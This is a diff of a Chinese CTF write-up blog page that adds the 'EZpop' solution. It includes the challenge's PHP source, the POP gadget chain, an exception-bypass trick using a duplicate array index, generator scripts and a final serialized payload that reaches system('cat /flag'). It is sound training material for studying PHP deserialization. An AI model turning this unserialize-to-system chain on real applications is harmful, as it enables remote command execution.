@@ -10,7 +10,7 @@
 <meta name="description" content="复盘" /><meta name="keywords" content='CTF' /><meta itemprop="name" content="XYCTF复盘">
 <meta itemprop="description" content="复盘"><meta itemprop="datePublished" content="2024-05-15T21:52:02+08:00" />
 <meta itemprop="dateModified" content="2024-05-15T21:52:02+08:00" />
-<meta itemprop="wordCount" content="332">
+<meta itemprop="wordCount" content="607">
 <meta itemprop="keywords" content="CTF," /><meta property="og:title" content="XYCTF复盘" />
 <meta property="og:description" content="复盘" />
 <meta property="og:type" content="article" />
@@ -33,7 +33,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/51ecbd6\/"
-    },"genre": "posts","keywords": "CTF","wordcount":  332 ,
+    },"genre": "posts","keywords": "CTF","wordcount":  607 ,
     "url": "http:\/\/localhost:1313\/posts\/51ecbd6\/","datePublished": "2024-05-15T21:52:02+08:00","dateModified": "2024-05-15T21:52:02+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/th.bing.com\/th\/id\/OIP.g4xSH6iLsfp1qckHDRrtzQHaHZ?w=208\u0026h=207\u0026c=7\u0026r=0\u0026o=5\u0026dpr=1.2\u0026pid=1.7"},"author": {
@@ -240,7 +240,7 @@ src="//tianqi.2345.com/plugin/widget/index.htm?s=2&z=3&t=1&v=1&d=3&bd=0&k=&f=&lt
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>XYCTF复盘</span>
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Liagu</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-05-15 21:52:02"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-05-15">2024-05-15</time></span>&nbsp;<span title="332 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      Liagu</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-05-15 21:52:02"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-05-15">2024-05-15</time></span>&nbsp;<span title="607 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -248,7 +248,6 @@ src="//tianqi.2345.com/plugin/widget/index.htm?s=2&z=3&t=1&v=1&d=3&bd=0&k=&f=&lt
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#xyctf2024复现">XYCTF2024复现</a></li>
     <li><a href="#web">WEB</a>
       <ul>
         <li><a href="#ezclass">ezclass</a></li>
@@ -259,16 +258,17 @@ src="//tianqi.2345.com/plugin/widget/index.htm?s=2&z=3&t=1&v=1&d=3&bd=0&k=&f=&lt
         <li><a href="#give-me-flag">give me flag</a></li>
         <li><a href="#牢牢记住逝者为大">牢牢记住，逝者为大</a></li>
         <li><a href="#我是一个复读机">我是一个复读机</a></li>
+        <li><a href="#ezpop">EZpop</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p><a href="https://gz.imxbt.cn/games/4/challenges"target="_blank" rel="external nofollow noopener noreferrer">XYCTF2024复现 - XYNU::CTF (imxbt.cn)</a></p>
-<h2 id="xyctf2024复现" class="heading-element"><span>XYCTF2024复现</span>
+<h1 id="xyctf2024复现" class="heading-element"><span>XYCTF2024复现</span>
   <a href="#xyctf2024%e5%a4%8d%e7%8e%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><h2 id="web" class="heading-element"><span>WEB</span>
+</h1><h2 id="web" class="heading-element"><span>WEB</span>
   <a href="#web" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
@@ -430,7 +430,140 @@ payload: 刚好13个字符</p>
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h3><p>ssti注入,没攻破</p>
-<p>EZmake</p></div><div class="post-footer" id="post-footer">
+<p>EZmake</p>
+<h3 id="ezpop" class="heading-element"><span>EZpop</span>
+  <a href="#ezpop" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AAA</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $s;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you get 2 A &lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        $p <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">s</span><span style="color:#f92672">-&gt;</span>$p;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BBB</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $c;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $d;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($name)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you get 2 B &lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span>        $b<span style="color:#f92672">=</span>$_POST;
+</span></span><span style="display:flex;"><span>        $c<span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span>;
+</span></span><span style="display:flex;"><span>        $d<span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">d</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($b[<span style="color:#e6db74">&#39;a&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unset</span>($b[<span style="color:#e6db74">&#39;a&#39;</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">call_user_func</span>($a,$b)($c)($d);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CCC</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you get 2 C &lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;xy&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;xy&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;noooooob!!!&#34;</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><ul>
+<li>在反序列化后访问未定义属性来触发 <code>__get</code>。</li>
+<li>在对象销毁时触发 <code>__destruct</code>。</li>
+<li>在对象转换为字符串时触发 <code>__toString</code>。</li>
+</ul>
+<h4 id="法一" class="heading-element"><span>法一</span>
+  <a href="#%e6%b3%95%e4%b8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>这里链子很简单入口是 CCC 的 destruct 然后 的get ，但是我们发现开始的 echo 触发 AAA 的 toString 然后p 触发 BBB  destruct 怎么也触发不了，那是因为我们需要绕过 throw  new Exception(&ldquo;noooooob!!!&rdquo;);</p>
+<p>众所周知，strrev函数可以把字符串倒过来再输出</p>
+<p>还是众所周知，implode函数可以将数组里的内容转为字符串</p>
+<p>链子很简单：<code>CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</code>
+主要是对<code>call_user_func($a, $b)($c)($d);</code>的理解
+还有这个姿势需要注意，<strong>PHP GC垃圾回收机制</strong>
+<a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0</a>
+还有就是<code>if (isset($b['a'])) { unset($b['a']); }</code>
+传入的b数组的a值会被删掉
+关于数组
+<img loading="lazy" src="/posts/assets/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png" alt="img" srcset="/posts/assets/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png?size=small, /posts/assets/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png?size=medium 1.5x, /posts/assets/v2-0417dcc9f73481a4991ea4d57a33a7de_1440w.png?size=large 2x" data-title="img" style="--width: 1125px;--aspect-ratio: 1125 / 522;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AAA</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $s;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $a;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BBB</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $c <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;system&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $d <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cat /flag&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CCC</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $c;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">CCC</span>();
+</span></span><span style="display:flex;"><span>    $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AAA</span>();
+</span></span><span style="display:flex;"><span>    $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BBB</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">array</span>($a, <span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  a:2:{i:0;O:3:&#34;CCC&#34;:1:{s:1:&#34;c&#34;;O:3:&#34;AAA&#34;:2:{s:1:&#34;s&#34;;O:3:&#34;BBB&#34;:2:{s:1:&#34;c&#34;;a:1:{i:0;s:6:&#34;system&#34;;}s:1:&#34;d&#34;;s:9:&#34;cat /flag&#34;;}s:1:&#34;a&#34;;N;}}i:1;i:0;}
+</span></span></span></code></pre></div><p>最终payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PHP</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/?</span><span style="color:#a6e22e">xy</span><span style="color:#f92672">=</span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;CCC&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;c&#34;</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;AAA&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;s&#34;</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;BBB&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;c&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;system&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;d&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;cat /flag&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;a&#34;</span>;<span style="color:#a6e22e">N</span>;}}<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">post</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#a6e22e">array_pop</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span><span style="color:#a6e22e">array_pop</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">array_pop</span>(<span style="color:#66d9ef">array</span>)<span style="color:#a6e22e">是删除数组元素并返回</span>(<span style="color:#a6e22e">这个想法基于题目的删除机制想出来的</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">array_pop</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;array_pop&#34;</span>))(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;system&#34;</span>))(<span style="color:#e6db74">&#34;cat /flag&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">array_pop</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;system&#34;</span>))(<span style="color:#e6db74">&#34;cat /flag&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">或者：a</span><span style="color:#f92672">=</span><span style="color:#a6e22e">current</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">b</span><span style="color:#f92672">=</span><span style="color:#a6e22e">current</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">current</span>(<span style="color:#66d9ef">array</span>)<span style="color:#a6e22e">是返回当前数组元素</span>(<span style="color:#a6e22e">那我不删除，直接返回也行</span>)</span></span></code></pre></div><p>法二</p>
+<p>看看题，有哪里不太一样：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;xy&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;xy&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;noooooob!!!&#34;</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>这里在 <code>unserialize</code> 之后直接 <code>throw</code> 了一个异常，反序列化出来的对象不会正常等到 <code>__destruct</code> 方法的执行，那就需要在反序列化的时候就做到：将对象创建，然后紧接着让它被销毁。</p>
+<p>这里可以使用数组来实现。尝试构造一个 <code>[0 =&gt; $obj, 0 =&gt; null]</code> 的数组，在反序列化的时候，会先创建目标对象，然后因为又遇到了同样下标为 0 的元素，所以会将目标对象销毁。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$post_a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;implode&#39;</span>;
+</span></span><span style="display:flex;"><span>$post_b <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;system&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /flag&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$bbb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BBB</span>();
+</span></span><span style="display:flex;"><span>$bbb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> $payload;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$aaa <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AAA</span>();
+</span></span><span style="display:flex;"><span>$aaa<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> $bbb;
+</span></span><span style="display:flex;"><span>$aaa<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;233&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ccc <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">CCC</span>();
+</span></span><span style="display:flex;"><span>$ccc<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> $aaa;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>([$ccc, <span style="color:#66d9ef">null</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 整个 [0 =&gt; $obj, 1 =&gt; null]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;i:1;N;}&#39;</span>, <span style="color:#e6db74">&#39;i:0;N;}&#39;</span>, $ser);
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 改成 [0 =&gt; $obj, 0 =&gt; null]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">urlencode</span>($ser));</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
@@ -455,7 +588,12 @@ payload: 刚好13个字符</p>
   <div class="post-nav"><a href="/posts/e89ab75/" class="post-nav-item" rel="prev" title="Huxblog搭建"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Huxblog搭建</a>
       <a href="/posts/ca8165e/" class="post-nav-item" rel="next" title="Hugo整理">Hugo整理<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
-</article>
+<div class="post-reward">
+    <div class="comment"></div>
+    <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
+    <label class="reward-button" for="fi-reward"><i class="fa-solid fa-qrcode fa-fw" aria-hidden="true"></i>Donate</label>
+    <div class="reward-ways" data-mode="static"></div>
+  </div></article>
 
   <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
